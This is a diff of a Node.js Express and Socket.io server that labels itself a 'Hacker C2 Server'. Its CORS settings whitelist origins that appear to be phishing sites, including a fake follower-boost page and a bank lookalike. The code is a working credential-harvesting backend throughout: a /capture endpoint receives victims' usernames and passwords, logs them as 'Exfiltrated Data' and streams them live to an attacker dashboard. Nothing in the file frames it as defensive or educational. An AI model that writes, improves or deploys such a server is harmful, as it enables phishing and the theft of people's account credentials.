@@ -1,66 +1,104 @@
-const express = require('express');
-const http = require('http');
-const { Server } = require('socket.io');
-const cors = require('cors');
+const express = require("express");
+const http = require("http");
+const { Server } = require("socket.io");
+const cors = require("cors");
 
 const app = express();
 
-// 1. Define allowed origins clearly
+/* ===============================
+   ✅ Allowed origins
+================================ */
 const allowedOrigins = [
-    "https://instafollowersboost12.netlify.app",
-    "https://globaldigitalbank1.netlify.app",
-    "https://hackerspanel.netlify.app"
+  "https://instafollowersboost12.netlify.app",
+  "https://globaldigitalbank1.netlify.app",
+    "https://hackerspanel.netlify.app",
+  "http://127.0.0.1:5500"                                                                                                                       
 ];
 
+/* ===============================
+   ✅ EXPRESS CORS (FUNCTION MODE)
+================================ */
 app.use(cors({
-    origin: allowedOrigins,
-    methods: ["GET", "POST"],
-    credentials: true
+  origin: function (origin, callback) {
+    if (!origin) return callback(null, true); // allow server-to-server
+    if (allowedOrigins.includes(origin)) {
+      return callback(null, true);
+    }
+    return callback(new Error("CORS not allowed"), false);
+  },
+  methods: ["GET", "POST"],
+  credentials: true
 }));
 
-app.use(express.json()); 
+app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
+/* ===============================
+   ✅ HTTP SERVER
+================================ */
 const server = http.createServer(app);
 
-// 2. Properly initialize Socket.io with the SAME CORS settings
+/* ===============================
+   ✅ SOCKET.IO WITH FULL CORS
+================================ */
 const io = new Server(server, {
-    cors: {
-        origin: allowedOrigins,
-        methods: ["GET", "POST"]
-    }
+  cors: {
+    origin: function (origin, callback) {
+      if (!origin) return callback(null, true);
+      if (allowedOrigins.includes(origin)) {
+        return callback(null, true);
+      }
+      return callback(new Error("Socket CORS blocked"), false);
+    },
+    methods: ["GET", "POST"],
+    credentials: true
+  },
+  transports: ["polling", "websocket"]
 });
 
-/* ===== Socket Events ===== */
+/* ===============================
+   ✅ SOCKET EVENTS
+================================ */
 io.on("connection", (socket) => {
-    console.log("🟢 Hacker dashboard connected:", socket.id);
-    socket.on("disconnect", () => {
-        console.log("🔴 Hacker dashboard disconnected:", socket.id);
-    });
+  console.log("🟢 Hacker dashboard connected:", socket.id);
+
+  socket.on("disconnect", () => {
+    console.log("🔴 Hacker dashboard disconnected:", socket.id);
+  });
 });
 
-/* ===== Capture Endpoint ===== */
-app.post('/capture', (req, res) => {
-    const logEntry = {
-        time: new Date().toLocaleTimeString(),
-        user: req.body.user || "unknown",
-        pass: req.body.pass || "***",
-        type: req.body.type || "PHISHING"
-    };
+/* ===============================
+   ✅ CAPTURE ENDPOINT
+================================ */
+app.post("/capture", (req, res) => {
+  const logEntry = {
+    time: new Date().toLocaleTimeString(),
+    user: req.body.user || "unknown",
+    pass: req.body.pass || "***",
+    type: req.body.type || "PHISHING"
+  };
 
-    console.log("📡 Exfiltrated Data:", logEntry);
+  console.log("📡 Exfiltrated Data:", logEntry);
 
-    // Broadcast data to your dashboard
-    io.emit('new_data', logEntry);
+  io.emit("new_data", logEntry);
 
-    res.status(200).json({ status: "Captured", data: logEntry });
+  res.status(200).json({
+    status: "Captured",
+    data: logEntry
+  });
 });
 
+/* ===============================
+   ✅ TEST ROUTE
+================================ */
 app.get("/", (req, res) => {
-    res.send("Hacker C2 Server Running 🚀");
+  res.send("Hacker C2 Server Running 🚀");
 });
 
+/* ===============================
+   ✅ START SERVER
+================================ */
 const PORT = process.env.PORT || 5000;
 server.listen(PORT, () => {
-    console.log(`🔥 Hacker Stream Server running on port ${PORT}`);
+  console.log(`🔥 Hacker Stream Server running on port ${PORT}`);
 });
